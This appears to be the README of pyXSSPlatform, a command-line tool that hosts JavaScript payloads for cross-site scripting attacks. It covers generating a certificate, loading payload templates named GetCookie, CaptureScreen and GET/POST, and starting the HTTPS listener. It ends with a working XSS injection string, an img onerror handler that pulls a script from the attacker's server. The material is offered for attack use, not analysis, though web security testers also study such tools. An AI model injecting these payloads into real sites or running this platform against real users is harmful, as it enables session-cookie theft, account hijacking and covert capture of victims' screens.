# pyXSSPlatform
Used to build an XSS platform on the command line.

Usage:

1.generate the cert file

You can use openssl like this:

`openssl req -new -x509 -keyout https_svr_key.pem -out https_svr_key.pem -days 3650 -nodes`

2.add your js code to index.js

You can refer to the files in Payload_Template folder

Payload:

- GetCookie
- CaptureScreen
- GET/POST

3.start the HTTPS server

`pyXSSPlatform.py <listen address> <listen port> <cert file>`

Eg.

`pyXSSPlatform.py 0.0.0.0 443 https_svr_key.pem`

Finally, you can try the following pyaload :

`<img src=x onerror=with(document)body.appendChild(document.createElement('script')).src="https://<your XSSPlatform ip>/index.js"></img>`
